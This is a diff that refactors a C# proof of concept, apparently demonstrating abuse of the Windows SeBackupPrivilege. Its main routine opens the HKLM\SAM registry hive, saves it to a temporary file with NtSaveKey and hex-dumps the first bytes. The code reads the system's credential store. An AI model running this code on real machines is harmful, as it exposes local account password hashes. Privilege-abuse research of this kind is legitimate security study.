@@ -1,8 +1,9 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Text;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace SeBackupPrivilegePoC
 {
@@ -270,6 +271,12 @@ namespace SeBackupPrivilegePoC
         /*
          * User defined functions
          */
+        static bool CompareIgnoreCase(string strA, string strB)
+        {
+            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
+        }
+
+
         static string GetWin32ErrorMessage(int code, bool isNtStatus)
         {
             int nReturnedLength;
@@ -285,18 +292,14 @@ namespace SeBackupPrivilegePoC
 
                 foreach (ProcessModule mod in modules)
                 {
-                    if (string.Compare(
-                        Path.GetFileName(mod.FileName),
-                        "ntdll.dll",
-                        StringComparison.OrdinalIgnoreCase) == 0)
+                    if (CompareIgnoreCase(Path.GetFileName(mod.FileName), "ntdll.dll"))
                     {
                         pNtdll = mod.BaseAddress;
                         break;
                     }
                 }
 
-                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
-                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
+                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE | FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
             }
             else
             {
@@ -313,44 +316,44 @@ namespace SeBackupPrivilegePoC
                 IntPtr.Zero);
 
             if (nReturnedLength == 0)
-            {
                 return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
-            }
             else
-            {
-                return string.Format(
-                    "[ERROR] Code 0x{0} : {1}",
-                    code.ToString("X8"),
-                    message.ToString().Trim());
-            }
+                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
         }
 
 
-        static byte[] ReadBytesFromFile(IntPtr hFile, int nSize)
+        static bool ReadBytesFromFile(IntPtr hFile, int nSize, out List<byte> data)
         {
             int error;
-            bool status;
-            byte[] data;
-            IntPtr buffer;
+            var status = false;
+            data = new List<byte>();
 
-            data = new byte[nSize];
-            buffer = Marshal.AllocHGlobal(nSize);
-            status = ReadFile(hFile, buffer, nSize, IntPtr.Zero, IntPtr.Zero);
-
-            if (!status)
+            do
             {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to read file.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-                Marshal.FreeHGlobal(buffer);
+                if (nSize < 0)
+                    break;
 
-                return (new byte[0]);
-            }
+                IntPtr pBuffer = Marshal.AllocHGlobal(nSize);
+                status = ReadFile(hFile, pBuffer, nSize, IntPtr.Zero, IntPtr.Zero);
 
-            Marshal.Copy(buffer, data, 0, nSize);
-            Marshal.FreeHGlobal(buffer);
+                if (!status)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to read file.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                }
+                else
+                {
+                    for (var offset = 0; offset < nSize; offset++)
+                    {
+                        data.Add(Marshal.ReadByte(pBuffer, offset));
+                    }
+                }
 
-            return data;
+                Marshal.FreeHGlobal(pBuffer);
+            } while (false);
+
+            return status;
         }
 
 
@@ -359,80 +362,86 @@ namespace SeBackupPrivilegePoC
         {
             int error;
             int ntstatus;
-            byte[] data;
-            string filePath = string.Format(
-                @"{0}\tmp_sam_hive.dat",
-                Environment.CurrentDirectory);
-            var objectAttributes = new OBJECT_ATTRIBUTES(
-                @"\Registry\Machine\SAM",
-                OBJ_CASE_INSENSITIVE);
+            IntPtr hFile;
+            string filePath = Path.GetTempFileName();
+            var objectAttributes = new OBJECT_ATTRIBUTES(@"\Registry\Machine\SAM", OBJ_CASE_INSENSITIVE);
+            var status = false;
 
-            Console.WriteLine("[>] Trying to create temporary file.");
-            Console.WriteLine("    |-> File Path : {0}", filePath);
-
-            IntPtr hFile = CreateFile(
-                filePath,
-                EFileAccess.GenericRead | EFileAccess.GenericWrite,
-                EFileShare.None,
-                IntPtr.Zero,
-                ECreationDisposition.CreateAlways,
-                EFileAttributes.Normal | EFileAttributes.DeleteOnClose,
-                IntPtr.Zero);
-
-            if (hFile == INVALID_HANDLE_VALUE)
+            do
             {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to create temporary file.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                Console.WriteLine("[>] Trying to create temporary file.");
+                Console.WriteLine("    |-> File Path : {0}", filePath);
 
-                return false;
-            }
+                hFile = CreateFile(
+                    filePath,
+                    EFileAccess.GenericRead | EFileAccess.GenericWrite,
+                    EFileShare.None,
+                    IntPtr.Zero,
+                    ECreationDisposition.CreateAlways,
+                    EFileAttributes.Normal | EFileAttributes.DeleteOnClose,
+                    IntPtr.Zero);
 
-            Console.WriteLine("[+] The temporary file is created successfully (hFile = 0x{0}).", hFile.ToString("X"));
-            Console.WriteLine("[>] Trying to open HKLM\\SAM.");
+                if (hFile == INVALID_HANDLE_VALUE)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to create temporary file.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] The temporary file is created successfully (hFile = 0x{0}).", hFile.ToString("X"));
+                }
 
-            ntstatus = NtOpenKey(
-                out IntPtr hKey,
-                KEY_READ,
-                in objectAttributes);
+                Console.WriteLine("[>] Trying to open HKLM\\SAM.");
 
-            if (ntstatus != STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to open registry key.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
+                ntstatus = NtOpenKey(out IntPtr hKey, KEY_READ, in objectAttributes);
+
+                if (ntstatus != STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to open registry key.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] HKLM\\SAM is opened successfully (hKey = 0x{0}).", hKey.ToString("X"));
+                }
+
+                Console.WriteLine("[>] Trying to save HKLM\\SAM to {0}.", filePath);
+
+                ntstatus = NtSaveKey(hKey, hFile);
+
+                if (ntstatus != STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to save registry key.");
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] HKLM\\SAM is saved successfully.");
+                    Console.WriteLine("[>] Trying to read the saved HKLM\\SAM.");
+
+                    status = ReadBytesFromFile(hFile, nSize, out List<byte> data);
+
+                    if (data.Count > 0)
+                    {
+                        Console.WriteLine("[+] Dumped HKLM\\SAM (Top {0} bytes):\n", nSize);
+                        HexDump.Dump(data.ToArray(), 1);
+                    }
+                }
+
+                NtClose(hKey);
+            } while (false);
+
+            if (hFile != INVALID_HANDLE_VALUE)
                 NtClose(hFile);
 
-                return false;
-            }
+            if (File.Exists(filePath))
+                File.Delete(filePath);
 
-            Console.WriteLine("[+] HKLM\\SAM is opened successfully (hKey = 0x{0}).", hKey.ToString("X"));
-            Console.WriteLine("[>] Trying to save HKLM\\SAM to {0}.", filePath);
-
-            ntstatus = NtSaveKey(hKey, hFile);
-            NtClose(hKey);
-
-            if (ntstatus != STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to save registry key.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
-                NtClose(hFile);
-
-                return false;
-            }
-
-            Console.WriteLine("[+] HKLM\\SAM is saved successfully.");
-            Console.WriteLine("[>] Trying to read the saved HKLM\\SAM.");
-
-            data = ReadBytesFromFile(hFile, nSize);
-            NtClose(hFile);
-
-            if (data.Length == 0)
-                return false;
-
-            Console.WriteLine("[+] Dumped HKLM\\SAM (Top {0} bytes):\n", nSize);
-            HexDump.Dump(data, 1);
-
-            return true;
+            return status;
         }
 
 
